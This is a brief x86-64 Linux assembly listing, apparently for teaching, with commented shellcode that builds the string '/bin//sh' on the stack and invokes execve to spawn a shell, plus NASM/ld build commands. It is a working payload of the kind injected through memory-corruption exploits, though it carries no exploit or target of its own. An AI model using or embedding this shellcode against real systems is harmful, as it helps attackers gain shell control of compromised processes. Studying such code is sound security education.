; To compile: $ nasm -f elf_x86_64 x64_Linux_Shellcode.asm -o x64_Linux_Shellcode.o
;             $ ld -m elf_x86_64 x64_Linux_Shellcode.o -o x64_Linux_Shellcode

section .text
  global _start

_start:
  xor rdx, rdx                  ; zero out RDX
  push rdx
  mov rax, 0x68732F2F6E69622F   ; mov 'hs//nib/' into RAX reg
  push rax                      ; add rax val into rsp
  mov rdi, rsp                  ; copy rsp pointer save into rdi
  push rdx                      ; NULL termination of array
push rdi                        ; address of '/bin//sh' is pushed onto the stack, lands under another stack address
mov rsi, rsp                    ; store '/bin//sh' pointer into rsi
xor rax, rax                    ; zero out rax
mov al, 0x3b                    ; 0x3b: execve() x64
syscall                         ; like int 0x80
